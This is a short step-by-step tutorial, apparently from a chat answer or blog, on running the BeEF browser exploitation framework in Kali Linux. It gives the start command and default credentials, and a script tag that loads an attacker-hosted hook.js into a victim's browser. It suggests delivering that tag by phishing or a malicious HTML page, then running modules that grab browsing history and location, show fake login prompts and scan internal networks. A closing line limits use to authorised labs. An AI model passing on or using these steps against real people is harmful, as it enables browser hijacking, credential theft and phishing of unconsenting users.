🔧 Step-by-Step: Using BeEF in Kali Linux
✅ Step 1: Start BeEF
Open your terminal and run:

bash
Copy
Edit
beef-xss
It will start the BeEF server and display important login info like:

UI URL: http://127.0.0.1:3000/ui/panel

Username: beef

Password: beef

Note: If BeEF doesn't start, try:

bash
Copy
Edit
sudo service apache2 start
✅ Step 2: Open the Web Interface
Open Firefox or Chromium in Kali.

Navigate to:

arduino
Copy
Edit
http://127.0.0.1:3000/ui/panel
Login with:

makefile
Copy
Edit
Username: beef
Password: beef
✅ Step 3: Hook a Browser
To "hook" a victim browser, you need to inject the BeEF JavaScript hook code into a webpage:

html
Copy
Edit
<script src="http://<your-ip>:3000/hook.js"></script>
Ways to hook:

Inject it into a test site you control.

Use phishing or social engineering.

Modify vulnerable web pages (in a lab environment).

📌 Example:
Send your victim a malicious HTML page with the hook code.

✅ Step 4: Wait for Victim to Connect
Once a browser opens the malicious page, it will appear under "Hooked Browsers" in the BeEF panel.

✅ Step 5: Use BeEF Modules
Click on the hooked browser → Go to "Commands" tab → Choose modules like:

Get Geolocation

Alert box

Grab browser history

Social engineering (Fake login prompt, etc.)

Network recon (internal IPs, routers, etc.)

BeEF will run the selected command in the victim’s browser.

✅ Step 6: Analyze Results
Use the Logs tab to view results of commands and browser behaviors.

⚙️ Tips:
Use BeEF in lab or legal testing environments only.

Run ifconfig or ip a to find your local IP for the hook URL.

Combine with Social Engineering Toolkit (SET) for phishing attacks.

🚫 Legal Warning:
BeEF is a powerful hacking tool and must only be used with explicit permission. Unauthorized use is illegal and unethical.
